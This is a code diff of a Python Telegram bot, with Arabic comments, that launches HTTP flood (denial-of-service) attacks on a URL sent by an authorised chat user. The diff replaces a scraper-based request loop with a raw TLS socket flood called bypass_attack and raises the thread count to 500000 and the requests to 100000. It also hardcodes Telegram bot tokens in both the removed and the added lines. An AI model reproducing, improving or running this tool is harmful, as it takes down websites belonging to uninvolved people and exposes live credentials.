@@ -1,3 +1,4 @@
+
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import cloudscraper
@@ -5,6 +6,8 @@ import threading
 from concurrent.futures import ThreadPoolExecutor
 import urllib3
 import time
+import socket
+import ssl
 
 # تعطيل التحقق من صحة شهادة SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -19,18 +22,21 @@ Owner = ['6358035274']
 NormalUsers = []
 
 # استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
-bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')
+bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')
 
 # متغيرات التحكم في الهجوم
 attack_in_progress = False
 attack_lock = threading.Lock()
 
-def attack(url):
+def bypass_attack(host, port=443):
     global attack_in_progress
     try:
         while attack_in_progress:
-            response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
-            print("تم إرسال الطلب إلى:", url)
+            context = ssl.create_default_context()
+            with socket.create_connection((host, port)) as sock:
+                with context.wrap_socket(sock, server_hostname=host) as ssock:
+                    ssock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {headers['User-Agent']}\r\n\r\n".encode())
+                    print(f"تم إرسال الطلب إلى: {host}:{port}")
     except Exception as e:
         print("حدث خطأ:", e)
 
@@ -52,12 +58,13 @@ def start_attack(message):
     if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
         url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
         num_repeats = int(message.text.split()[2]) if len(message.text.split()) > 2 else 1
-        
+        host = url.split("//")[-1].split("/")[0]  # استخراج اسم المضيف من الرابط
+
         start_time = time.time()  # بدء المؤقت
 
         # زيادة عدد الخيوط
-        max_workers = 500  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
-        num_requests = 10000  # يمكنك أيضاً تعديل عدد الطلبات
+        max_workers = 500000  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
+        num_requests = 100000  # يمكنك أيضاً تعديل عدد الطلبات
 
         with attack_lock:
             attack_in_progress = True
@@ -67,7 +74,7 @@ def start_attack(message):
         for _ in range(num_repeats):
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
                 for _ in range(num_requests):
-                    executor.submit(attack, url)
+                    executor.submit(bypass_attack, host)
 
         end_time = time.time()  # انتهاء المؤقت
 
